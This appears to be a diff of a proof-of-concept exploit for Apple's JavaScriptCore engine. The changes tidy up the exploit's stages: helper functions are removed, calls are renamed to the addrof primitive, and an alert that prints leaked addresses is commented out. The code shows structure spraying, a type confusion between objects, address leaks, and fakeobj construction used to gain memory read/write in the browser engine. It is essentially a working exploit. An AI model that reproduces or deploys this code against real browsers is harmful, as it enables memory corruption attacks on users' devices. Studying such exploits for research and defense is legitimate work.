@@ -24,9 +24,6 @@ function i2jsv(x) {
 function hex(x) {
       return `0x${x.toString(16)}`
 }
-function d(x) {
-    print(describe(x));
-}
 function pf(x) {
     print(hex(f2i(x)));
 }
@@ -37,27 +34,6 @@ function gc() {
       for (let i = 0; i < 0x10; i++) {
               new ArrayBuffer(0x1000000);
           }
-}
-function makeJITFunc() {
-    function target(num) {
-        for (var i = 2; i < num; i++) {
-            if (num % i === 0) {
-                return false;
-            }
-        }
-        return true;
-    }
-    // Force JIT compilation.
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    return target;
 }
 // /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
 // The PoC will confuse objX with objY.
@@ -243,7 +219,7 @@ function pwn() {
     }
 
     var manager = structure_spray[500]
-    var leak_addr = stage1.addrof(manager)
+    var leak_addr = addrof(manager)
     //print('leaking from: '+ hex(leak_addr))
 
     // properties are stored in butterfly to the right of pointer
@@ -301,17 +277,17 @@ function pwn() {
 
     // this would cause p1 to be interpreted as an object
     // with p2==manager==leak_addr being used as butterfly
-    var fake_addr = stage1.addrof(outer) + FPO + 0x8
+    var fake_addr = addrof(outer) + FPO + 0x8
     //print('fake obj @ ' + hex(fake_addr))
 
     var unboxed_addr = addrof(unboxed)
     var boxed_addr = addrof(boxed)
     var victim_addr = addrof(victim)
-    alert('leak ' + hex(leak_addr)
+    /*alert('leak ' + hex(leak_addr)
         + '\nunboxed ' + hex(unboxed_addr)
         + '\nboxed ' + hex(boxed_addr)
         + '\nvictim ' + hex(victim_addr))
-
+*/
     var holder = {fake: {}}
     holder.fake = fakeobj(fake_addr)
 
